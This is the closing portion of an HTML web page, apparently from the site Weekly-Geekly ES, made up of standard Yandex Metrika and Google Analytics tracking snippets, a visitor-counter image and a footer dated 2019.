<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>